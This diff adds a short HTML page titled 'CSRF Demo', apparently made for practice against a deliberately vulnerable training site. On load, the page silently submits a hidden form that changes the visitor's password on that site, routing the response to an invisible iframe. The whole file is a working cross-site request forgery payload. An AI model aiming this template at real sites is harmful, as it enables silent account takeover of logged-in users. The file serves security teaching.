@@ -1,0 +1,14 @@
+<html>
+    <head>
+        <title>CSRF Demo</title>
+    </head>
+    <body onload="document.csrfForm.submit()">
+        <h1>CSRF Demo</h1>
+        <form action="https://hack-yourself-first.com/Account/ChangePassword"
+        method="post" target="hiddenFrame" name="csrfForm">
+        <input type="hidden" name="NewPassword" value="bhaibhai"/>
+        <input type="hidden" name="ConfirmPassword" value="bhaibhai"/>
+    </form>
+        <iframe name="hiddenFrame" style="display: none;"></iframe>
+    </body>
+</html>
